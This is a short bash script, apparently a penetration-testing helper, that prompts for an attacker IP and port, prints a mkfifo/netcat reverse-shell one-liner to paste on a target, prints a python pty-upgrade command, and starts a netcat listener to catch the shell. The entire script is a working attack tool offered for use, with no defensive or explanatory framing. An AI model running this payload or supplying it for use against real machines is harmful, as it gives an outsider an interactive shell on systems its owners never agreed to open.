#!/bin/bash

RED='\033[0;31m'
NC='\033[0m'

echo "Reverse shell handler with PTY upgrade abilities"

read -p "LHOST IP: " LHOST
read -p "LHOST PORT: " LPORT

echo
echo -e "Here's Your Payload: $RED (rm /tmp/_;mkfifo /tmp/_;cat /tmp/_|sh 2>&1|nc $LHOST $LPORT >/tmp/_) >/dev/null 2>&1 & $NC"
echo
echo "Paste payload on target and wait for the shell!"
echo
echo -e "Upgrade to PTY Shell: $RED python3 -c 'import pty; pty.spawn(\"/bin/bash\")'$NC "
echo

nc -lvnp $LPORT


